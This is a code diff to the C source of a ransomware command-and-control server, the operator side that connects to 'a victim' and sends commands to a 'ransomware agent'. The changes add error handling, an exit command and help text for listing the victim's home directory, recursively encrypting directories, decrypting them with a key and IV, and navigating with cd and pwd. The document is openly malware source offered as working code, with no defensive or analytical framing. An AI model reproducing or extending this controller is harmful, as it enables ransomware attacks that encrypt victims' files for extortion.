@@ -8,7 +8,7 @@
 
 void usage();
 int command_handler(char * command, int sockid, int client_socket);
-
+void handleError(int sockid);
 
 int main()
 {
@@ -34,19 +34,20 @@ int main()
     {
         printf("Error during binding\n");
         printf("%s", strerror(errno));
+        handleError(sockid);
     }
 
     printf("Waiting for connection...\n");
     if (listen(sockid,1)<0)
     {
         printf("Error when listening\n");
-        abort();
+        handleError(sockid);
     }
     len = sizeof(client_addr);
     if ((client_socket = accept(sockid, (struct sockaddr *)&client_addr, &len))<0)
     {
         printf("Error when accepting connection\n");
-        abort();
+        handleError(sockid);
     }
 
     printf("Connected to a victim\n");
@@ -71,7 +72,11 @@ void usage()
     printf("h : prints help\n");
     printf("ls : list every directories of the victim's home directory\n");
     printf("enc : recursively encrypt a directory that you are in\n");
-    printf("dec <directory> <key> <iv> : recursively encrypt a directory\n");
+    printf("dec <key> <iv> : recursively decrypt the directory that you are in\n");
+    printf("pwd : print the current working directory\n");
+    printf("cd <directory> : change directory to specified directory\n");
+    printf("clear : clear the terminal\n");
+    printf("exit : exit the programm and close the ransomware agent\n");
 
 }
 
@@ -89,14 +94,14 @@ int command_handler(char * command,int sockid, int client_socket)
         if (send(client_socket, (const char *)command, strlen(command)+1,0)<0) 
         {
             printf("Error during sending\n");
-            abort();
+            handleError(sockid);
         }
         status = recv(client_socket, (char *)buffer, 2048, 0 );
         if (status<=0)
         {
             printf("Connection shutdown\n");
             printf("%s\n", strerror(errno));
-            abort();
+            handleError(sockid);
         }
 
         printf("%s\n", buffer);
@@ -108,14 +113,13 @@ int command_handler(char * command,int sockid, int client_socket)
         if (send(client_socket, (const char *)command, strlen(command)+1,0)<0) 
         {
             printf("Error during sending\n");
-            abort();
+            handleError(sockid);
         }
         status = recv(client_socket, (char *)buffer, 2048, 0 );
         if (status<=0)
         {
             printf("Connection shutdown\n");
-            printf("%s\n", strerror(errno));
-            abort();
+            handleError(sockid);
         }
         printf("%s\n", buffer);
     }
@@ -126,14 +130,13 @@ int command_handler(char * command,int sockid, int client_socket)
         if (send(client_socket, (const char *)command, strlen(command)+1,0)<0) 
         {
             printf("Error during sending\n");
-            abort();
+            handleError(sockid);
         }
         status = recv(client_socket, (char *)buffer, 2048, 0 );
         if (status<=0)
         {
             printf("Connection shutdown\n");
-            printf("%s\n", strerror(errno));
-            abort();
+            handleError(sockid);
         }
         printf("%s\n", buffer);
     }
@@ -144,14 +147,13 @@ int command_handler(char * command,int sockid, int client_socket)
         if (send(client_socket, (const char *)command, strlen(command)+1,0)<0) 
         {
             printf("Error during sending\n");
-            abort();
+            handleError(sockid);
         }
         status = recv(client_socket, (char *)buffer, 2048, 0 );
         if (status<=0)
         {
             printf("Connection shutdown\n");
-            printf("%s\n", strerror(errno));
-            abort();
+            handleError(sockid);
         }
         printf("%s\n", buffer);
     }
@@ -162,20 +164,24 @@ int command_handler(char * command,int sockid, int client_socket)
         if (send(client_socket, (const char *)command, strlen(command)+1,0)<0) 
         {
             printf("Error during sending\n");
-            abort();
+            handleError(sockid);
         }
         status = recv(client_socket, (char *)buffer, 2048, 0 );
         if (status<=0)
         {
             printf("Connection shutdown\n");
-            printf("%s\n", strerror(errno));
-            abort();
+            handleError(sockid);
         }
         printf("%s\n", buffer);
     }
-    else if (strncmp(command, "clear",5) == 0)
+    else if (strncmp(command,"clear",5) == 0)
     {
         system("/bin/clear"); 
+    }
+    else if (strncmp(command,"exit",4) == 0) 
+    {
+        close(sockid);
+        exit(0);
     }
     else 
     {
@@ -184,3 +190,8 @@ int command_handler(char * command,int sockid, int client_socket)
 
 }
 
+void handleError(int sockid)
+{
+    close(sockid);
+    abort();
+}
